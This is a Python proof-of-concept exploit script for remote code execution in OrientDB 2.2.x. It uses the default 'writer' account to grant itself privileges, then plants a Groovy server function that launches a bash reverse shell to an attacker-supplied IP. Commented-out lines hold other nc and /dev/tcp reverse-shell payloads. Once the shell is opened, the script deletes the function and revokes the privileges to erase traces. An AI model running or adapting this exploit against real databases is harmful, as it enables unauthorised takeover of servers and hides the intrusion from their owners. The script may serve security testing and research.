#! /usr/bin/env python
#-*- coding: utf-8 -*-
# OrientDB <= 2.22 RCE PoC

import sys
import requests
import json
import string
import random

target = sys.argv[1]

try:
    port = sys.argv[2] if sys.argv[2] else 2480
except:
    port = 2480

url = "http://%s:%s/command/GratefulDeadConcerts/sql/-/20?format=rid,type,version,class,graph"%(target,port)


def random_function_name(size=5, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def enum_databases(target,port="2480"):

    base_url = "http://%s:%s/listDatabases"%(target,port)
    req = requests.get(base_url)

    if req.status_code == 200:
        #print "[+] Database Enumeration successful"
        database = req.json()['databases']

        return database

    return False

def check_version(target,port="2480"):
    base_url = "http://%s:%s/listDatabases"%(target,port)
    req = requests.get(base_url)

    if req.status_code == 200:

        headers = req.headers['server']
        #print headers
        if "2.2" in headers or "3." in headers:
            return True

    return False

def run_queries(permission,db,content=""):

    databases = enum_databases(target)

    url = "http://%s:%s/command/%s/sql/-/20?format=rid,type,version,class,graph"%(target,port,databases[0])

    priv_enable = ["create","read","update","execute","delete"]
    #query = "GRANT create ON database.class.ouser TO writer"

    for priv in priv_enable:

        if permission == "GRANT":
            query = "GRANT %s ON %s TO writer"%(priv,db)
        else:
            query = "REVOKE %s ON %s FROM writer"%(priv,db)
        req = requests.post(url,data=query,auth=('writer','writer'))
        if req.status_code == 200:
            pass
        else:
            if priv == "execute":
                return True
            return False

    print "[+] %s"%(content)
    return True

def priv_escalation(target,port="2480"):

    print "[+] Checking OrientDB Database version is greater than 2.2"

    if check_version(target,port):

        priv1 = run_queries("GRANT","database.class.ouser","Privilege Escalation done checking enabling operations on database.function")
        priv2 = run_queries("GRANT","database.function","Enabled functional operations on database.function")
        priv3 = run_queries("GRANT","database.systemclusters","Enabling access to system clusters")

        if priv1 and priv2 and priv3:
            return True

    return False

def exploit(target,port="2480"):

    #query = '"@class":"ofunction","@version":0,"@rid":"#-1:-1","idempotent":null,"name":"most","language":"groovy","code":"def command = \'bash -i >& /dev/tcp/0.0.0.0/8081 0>&1\';File file = new File(\"hello.sh\");file.delete();file << (\"#!/bin/bash\\n\");file << (command);def proc = \"bash hello.sh\".execute(); ","parameters":null'

    #query = {"@class":"ofunction","@version":0,"@rid":"#-1:-1","idempotent":None,"name":"ost","language":"groovy","code":"def command = 'whoami';File file = new File(\"hello.sh\");file.delete();file << (\"#!/bin/bash\\n\");file << (command);def proc = \"bash hello.sh\".execute(); ","parameters":None}

    func_name = random_function_name()

    print func_name

    databases = enum_databases(target)

    reverse_ip = raw_input('Enter the ip to connect back: ')

    query = '{"@class":"ofunction","@version":0,"@rid":"#-1:-1","idempotent":null,"name":"'+func_name+'","language":"groovy","code":"def command = \'bash -i >& /dev/tcp/'+reverse_ip+'/8081 0>&1\';File file = new File(\\"hello.sh\\");file.delete();file << (\\"#!/bin/bash\\\\n\\");file << (command);def proc = \\"bash hello.sh\\".execute();","parameters":null}'
    #query = '{"@class":"ofunction","@version":0,"@rid":"#-1:-1","idempotent":null,"name":"'+func_name+'","language":"groovy","code":"def command = \'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.0.0.0 8081 >/tmp/f\' \u000a File file = new File(\"hello.sh\")\u000a     file.delete()       \u000a     file << (\"#!/bin/bash\")\u000a     file << (command)\n    def proc = \"bash hello.sh\".execute() ","parameters":null}'
    #query = {"@class":"ofunction","@version":0,"@rid":"#-1:-1","idempotent":None,"name":"lllasd","language":"groovy","code":"def command = \'bash -i >& /dev/tcp/0.0.0.0/8081 0>&1\';File file = new File(\"hello.sh\");file.delete();file << (\"#!/bin/bash\\n\");file << (command);def proc = \"bash hello.sh\".execute();","parameters":None}
    req = requests.post("http://%s:%s/document/%s/-1:-1"%(target,port,databases[0]),data=query,auth=('writer','writer'))

    if req.status_code == 201:

        #print req.status_code
        #print req.json()

        func_id = req.json()['@rid'].strip("#")
        #print func_id

        print "[+] Exploitation successful, get ready for your shell.Executing %s"%(func_name)

        req = requests.post("http://%s:%s/function/%s/%s"%(target,port,databases[0],func_name),auth=('writer','writer'))
        #print req.status_code
        #print req.text

        if req.status_code == 200:
            print "[+] Open netcat at port 8081.."
        else:
            print "[+] Exploitation failed at last step, try running the script again."
            print req.status_code
            print req.text

        #print "[+] Deleting traces.."

        req = requests.delete("http://%s:%s/document/%s/%s"%(target,port,databases[0],func_id),auth=('writer','writer'))
        priv1 = run_queries("REVOKE","database.class.ouser","Cleaning Up..database.class.ouser")
        priv2 = run_queries("REVOKE","database.function","Cleaning Up..database.function")
        priv3 = run_queries("REVOKE","database.systemclusters","Cleaning Up..database.systemclusters")

        #print req.status_code
        #print req.text

def main():

    target = sys.argv[1]
    #port = sys.argv[1] if sys.argv[1] else 2480
    try:
        port = sys.argv[2] if sys.argv[2] else 2480
        #print port
    except:
        port = 2480
    if priv_escalation(target,port):
        exploit(target,port)
    else:
        print "[+] Target not vulnerable"

main()